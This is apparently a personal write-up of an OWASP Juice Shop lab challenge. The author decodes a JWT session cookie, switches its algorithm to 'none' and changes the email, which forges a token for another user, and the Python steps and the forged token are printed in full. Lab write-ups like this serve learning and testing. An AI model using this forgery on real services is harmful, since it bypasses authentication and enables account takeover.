This is my first foray into JWT land, so I've got some reading up to do.

Starting with the [JSON Web Token](https://en.wikipedia.org/wiki/JSON_Web_Token) Wikipedia page seems like a good enough place.

First off, where is this thing stored? Checking the Cookies storage in the
Chrome Inspector turns up the `token` cookie. We can do some basic checks to
confirm that this is the cookie:

```
In [10]: s = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwiZW1haWwiOiJqaW1AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6ImU1NDFjYTdlY2Y3MmI4ZDEyODY0NzRmYzYxM2U1ZTQ1IiwiY3JlYXRlZEF0IjoiMjAxOC0wMy0yOSAxNDoyODo1My42ODcgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAxOC0wMy0yOSAxNDoyODo1My42ODcgKzAwOjAwIn0sImlhdCI6MTUyMjMzMzk3NywiZXhwIjoxNTIyMzUxOTc3fQ.sJdk9Xdx3E6AGx3lp640dQTbGhWX0FluQBLAB3goFyEwpCBi4PH_11qi2EMad7-kBFiYDNzE66WbUhY7IEYEIdUN1x-avdoaijZuWpPkeEgmhOwWhXkTwm7O1T3wwH5CSZ5i_1yAxAGqX0HHUx1QtrRRD-sUii0_rdISe3JSdBE'

In [11]: len(s.split('.'))
Out[11]: 3
```

From the Wiki page:

> JWTs generally have three parts: a header, a payload, and a signature.

Okay, seems we're on the right track.

```
In [14]: parts = s.split('.')

In [15]: base64.b64decode(parts[0])
Out[15]: b'{"alg":"RS256","typ":"JWT"}'
In [21]: base64.b64decode(parts[1])
---------------------------------------------------------------------------
Error                                     Traceback (most recent call last)
<ipython-input-21-5e0c367146c7> in <module>()
----> 1 base64.b64decode(parts[1])

/usr/lib/python3.5/base64.py in b64decode(s, altchars, validate)
     86     if validate and not re.match(b'^[A-Za-z0-9+/]*={0,2}$', s):
     87         raise binascii.Error('Non-base64 digit found')
---> 88     return binascii.a2b_base64(s)
     89 
     90 

Error: Incorrect padding
```

Hmm, the second part of the token *should* be Base64 decodable, but it seems
something's off with the padding. If my memory of how Base64 encoding works is
correct, I believe we can pad it with '='.

```
In [22]: base64.b64decode(parts[1]+'=')
---------------------------------------------------------------------------
Error                                     Traceback (most recent call last)
<ipython-input-22-a29920dd679d> in <module>()
----> 1 base64.b64decode(parts[1]+'=')

/usr/lib/python3.5/base64.py in b64decode(s, altchars, validate)
     86     if validate and not re.match(b'^[A-Za-z0-9+/]*={0,2}$', s):
     87         raise binascii.Error('Non-base64 digit found')
---> 88     return binascii.a2b_base64(s)
     89 
     90 

Error: Incorrect padding

In [23]: base64.b64decode(parts[1]+'==')
Out[23]: b'{"status":"success","data":{"id":2,"email":"jim@juice-sh.op","password":"e541ca7ecf72b8d1286474fc613e5e45","createdAt":"2018-03-29 14:28:53.687 +00:00","updatedAt":"2018-03-29 14:28:53.687 +00:00"},"iat":1522333977,"exp":1522351977}'
```

Nice, that worked. Okay, we're trying to forge a token for
`jwtn3d@juice-sh.op`, can we just change the email and re-encode?

Looks like simply changing the email address and re-encoding doesn't do the
trick. Let's investigate some attacks against JWT.

After Googling around a bit [this](https://www.owasp.org/index.php/JSON_Web_Token_(JWT)_Cheat_Sheet_for_Java)
OWASP JWT cheatsheet is very useful. Using the NONE hashing algorithm, changing
the email address, and re-encoding does the trick! To recap:

```
In [79]: header = base64.b64decode(parts[0]).decode('utf-8')
In [80]: payload = base64.b64decode(parts[1]+'==').decode('utf-8')
In [81]: updated_header = header.replace('RS256', 'none')
In [82]: updated_payload = payload.replace('jim@juice-sh.op', 'jwtn3d@juice-sh.op')
In [83]: b64_updated_header = base64.b64encode(str.encode(updated_header)).decode('utf-8')
In [84]: b64_updated_payload = base64.b64encode(str.encode(updated_payload)).decode('utf-8')
In [85]: token = '.'.join([b64_updated_header.strip('='), b64_updated_payload.strip('='), parts[2]])
In [86]: token
Out[86]: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwiZW1haWwiOiJqd3RuM2RAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6ImU1NDFjYTdlY2Y3MmI4ZDEyODY0NzRmYzYxM2U1ZTQ1IiwiY3JlYXRlZEF0IjoiMjAxOC0wMy0yOSAxNDoyODo1My42ODcgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAxOC0wMy0yOSAxNDoyODo1My42ODcgKzAwOjAwIn0sImlhdCI6MTUyMjMzMzk3NywiZXhwIjoxNTIyMzUxOTc3fQ.sJdk9Xdx3E6AGx3lp640dQTbGhWX0FluQBLAB3goFyEwpCBi4PH_11qi2EMad7-kBFiYDNzE66WbUhY7IEYEIdUN1x-avdoaijZuWpPkeEgmhOwWhXkTwm7O1T3wwH5CSZ5i_1yAxAGqX0HHUx1QtrRRD-sUii0_rdISe3JSdBE'
```

Copying that token string into the token Cookie in the Chrome Inspector solves
the challenge!

I'm not entirely sure why JWT doesn't include the '=' padding at the end of
its Base64 encoded parts, but that's how the token was initially presented.
